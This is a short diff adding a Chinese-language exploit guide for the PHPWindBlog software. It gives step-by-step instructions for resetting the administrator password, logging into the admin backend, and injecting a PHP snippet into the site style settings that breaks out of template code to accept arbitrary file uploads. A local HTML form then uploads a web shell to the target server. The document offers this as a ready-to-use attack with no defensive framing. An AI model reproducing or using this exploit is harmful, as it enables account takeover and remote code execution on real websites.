@@ -1,0 +1,37 @@
+
+
+--==  PHPWindBlog漏洞利用程序  ==--
+
+                               使用说明
+
+1：注册一个新的blog 然后登录！
+
+2：查看管理员帐号！
+
+3：修改管理员密码！帐号的地方直接写管理员帐号，密码的地方填上自己想改的密码
+
+4：用刚才修改过后的帐号和密码直接登录后台！
+
+5：拿WebShell方法：
+
+  进后台找到“网站风格设置”  在里面加上以下代码,(切记)得要顶格写，代码如下：
+
+<style type='text/css'>
+</style>
+<!--
+EOT;
+?>-->
+<?copy($_FILES[MyFile][tmp_name],$_FILES[MyFile][name]);?>
+<!--
+<?php
+print <<<EOT
+-->
+
+然后在本地新建一个提交表单代码如下：
+
+<form ENCTYPE="multipart/form-data" ACTION="http://目标服务器/index.php" 
+METHOD="POST">
+<input NAME="MyFile" TYPE="file">
+<input VALUE=" 提交 " TYPE="submit">
+</form>
+
